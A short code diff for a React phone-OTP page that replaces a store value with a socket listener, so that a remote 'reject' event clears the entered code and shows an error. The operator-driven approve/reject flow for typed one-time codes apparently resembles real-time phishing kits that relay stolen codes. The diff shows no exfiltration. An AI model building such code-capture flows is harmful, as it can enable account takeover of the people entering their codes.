@@ -9,7 +9,7 @@ import {
   isFormApproved,
   isFormRejected,
   navigateToPage,
-  codeAction,
+  socket,
 } from "@/lib/store";
 
 const serviceProviderNextPages: Record<string, string> = {
@@ -63,16 +63,26 @@ export default function PhoneOTP() {
     }
   }, [isFormRejected.value]);
 
-  // Handle code action (reject) - يبقي العميل على نفس الصفحة مع رسالة خطأ
+  // Handle code action (reject) - الاستماع مباشرة للحدث من السوكت
   useEffect(() => {
-    if (codeAction.value?.action === 'reject') {
-      setOtp("");
-      setError(true);
-      inputRef.current?.focus();
-      // إعادة تعيين codeAction بعد المعالجة
-      codeAction.value = null;
-    }
-  }, [codeAction.value]);
+    const s = socket.value;
+    if (!s) return;
+
+    const handleCodeAction = (data: { action: string; codeIndex: number }) => {
+      console.log("PhoneOTP: Code action received:", data);
+      if (data.action === 'reject') {
+        setOtp("");
+        setError(true);
+        inputRef.current?.focus();
+      }
+    };
+
+    s.on("code:action", handleCodeAction);
+
+    return () => {
+      s.off("code:action", handleCodeAction);
+    };
+  }, []);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
